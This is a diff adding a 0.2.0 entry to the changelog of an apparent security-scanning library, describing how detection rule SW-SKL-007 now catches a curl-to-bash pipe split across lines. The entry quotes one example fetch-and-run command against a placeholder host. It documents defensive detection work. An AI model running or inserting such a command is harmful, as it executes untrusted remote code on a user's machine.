@@ -1,5 +1,13 @@
 # Changelog
 
+## 0.2.0 (2026-10-20)
+
+Rules version `2026.10.1`: one rule detects more.
+
+- SW-SKL-007 joins a pipe continued on the next line inside a fenced code block of a Markdown file
+  (`curl -s https://x.example/i.sh |` then `bash`), and treats an extensionless file that starts with `#!`
+  as a script, so the same split is caught there too. A finding is numbered by the command's first line.
+
 ## 0.1.0 (2026-10-19)
 
 The first release: the engine of the hosted Spellwarden product as a library.
